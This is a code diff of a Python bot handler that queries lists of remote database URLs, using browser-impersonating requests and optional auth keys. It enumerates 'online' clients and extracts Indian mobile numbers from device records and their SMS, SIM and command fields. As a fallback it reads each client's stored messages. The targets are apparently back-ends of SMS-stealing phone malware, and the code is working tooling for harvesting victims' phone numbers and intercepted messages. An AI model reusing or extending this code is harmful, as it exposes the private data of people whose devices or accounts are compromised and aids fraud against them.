@@ -1375,26 +1375,35 @@ def handle_all(message):
 
                 for item in urls:
                     item = item.strip()
-                    if "?" in item:
-                        base_url, query = item.split("?", 1)
-                        if not base_url.endswith("/"):
-                            base_url += "/"
-                        clients_endpoint = f"{base_url}clients.json?{query}"
-                    else:
-                        if not item.endswith("/"):
-                            item += "/"
-                        clients_endpoint = f"{item}clients.json"
-                        query = ""
+                    base_url = item.split('?')[0].rstrip('/')
+                    auth_key = ""
+                    if 'auth=' in item:
+                        try:
+                            auth_key = item.split('auth=')[1].split('&')[0]
+                        except Exception:
+                            pass
+
+                    if not base_url.endswith('/'):
+                        base_url += '/'
+
+                    clients_endpoint = f"{base_url}clients.json"
+                    if auth_key:
+                        clients_endpoint += f"?auth={auth_key}"
 
                     try:
                         res = cffi_requests.get(clients_endpoint, impersonate="chrome120", timeout=12)
                         if res.status_code == 200:
                             data = res.json() or {}
-                            online_cids = list(data.keys()) if isinstance(data, dict) else []
+                            online_cids = [
+                                cid for cid, cdata in data.items() 
+                                if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("status") == "true" or cdata.get("online") is True)
+                            ]
+                            if not online_cids and len(data) > 0:
+                                online_cids = list(data.keys())
 
                             if online_cids:
                                 total_online_all += len(online_cids)
-                                database_tasks.append((base_url, query, online_cids, item, data))
+                                database_tasks.append((base_url, auth_key, online_cids, item, data))
                     except Exception:
                         continue
 
@@ -1410,44 +1419,55 @@ def handle_all(message):
                 )
 
                 total_processed = 0
-                for base_url, query, online_cids, full_item, clients_dict in database_tasks:
+                for base_url, auth_key, online_cids, full_item, clients_dict in database_tasks:
                     for cid in online_cids:
                         phone_number = None
-                        
-                        # 1. Check if CID itself is the phone number
-                        clean_cid = ''.join(filter(str.isdigit, str(cid)))
-                        if len(clean_cid) >= 10:
-                            possible_cid_num = clean_cid[-10:]
-                            if possible_cid_num[0] in '6789':
-                                phone_number = possible_cid_num
+                        dev_data = clients_dict.get(cid, {})
 
-                        # 2. Check client fields
-                        if not phone_number:
-                            c_data = clients_dict.get(cid, {})
-                            if isinstance(c_data, dict):
-                                for k in ('mobNo', 'phoneNumber', 'phone', 'mobile', 'msisdn', 'number'):
-                                    p_val = str(c_data.get(k, '')).strip()
-                                    clean_p = ''.join(filter(str.isdigit, p_val))
-                                    if len(clean_p) >= 10:
-                                        possible_num = clean_p[-10:]
-                                        if possible_num[0] in '6789':
-                                            phone_number = possible_num
+                        def valid_phone(m):
+                            m_clean = re.sub(r"[^0-9]", "", str(m or ""))
+                            return m_clean[-10:] if len(m_clean) >= 10 and m_clean[-10:][0] in "6789" else ""
+
+                        if isinstance(dev_data, dict):
+                            for k in ("mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId", "number"):
+                                if dev_data.get(k):
+                                    r = valid_phone(dev_data[k])
+                                    if r:
+                                        phone_number = r
+                                        break
+                            
+                            if not phone_number:
+                                for container in ("sims", "action", "sms", "smsCommand", "webhookEvent", "sendSms", "commands"):
+                                    c = dev_data.get(container)
+                                    items = list(c.values()) + [c] if isinstance(c, dict) else (c if isinstance(c, list) else [])
+                                    for it in items:
+                                        if isinstance(it, dict):
+                                            for k in ("phoneNumber", "number", "phone", "msisdn", "to", "mobile", "subId"):
+                                                if it.get(k):
+                                                    r = valid_phone(it[k])
+                                                    if r:
+                                                        phone_number = r
+                                                        break
+                                        if phone_number:
                                             break
 
-                        # 3. Fallback: Fetch messages/{cid}.json and apply extract_phone regex
+                        if not phone_number:
+                            clean_cid = ''.join(filter(str.isdigit, str(cid)))
+                            if len(clean_cid) >= 10 and clean_cid[-10:][0] in '6789':
+                                phone_number = clean_cid[-10:]
+
                         if not phone_number:
                             msg_endpoint = f"{base_url}messages/{cid}.json"
-                            if query:
-                                msg_endpoint += f"?{query}"
+                            if auth_key:
+                                msg_endpoint += f"?auth={auth_key}"
                             try:
                                 m_res = cffi_requests.get(msg_endpoint, impersonate="chrome120", timeout=8)
                                 msgs = m_res.json() or {}
                                 if isinstance(msgs, dict):
                                     text_data = str(msgs)
-                                    cleaned_text = re.sub(r'[\s\-]', '', text_data)
-                                    match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', cleaned_text)
+                                    match = re.search(r'\b([6-9]\d{9})\b', text_data)
                                     if match:
-                                        phone_number = match.group(1) or match.group(2)
+                                        phone_number = match.group(1)
                             except Exception:
                                 pass
 
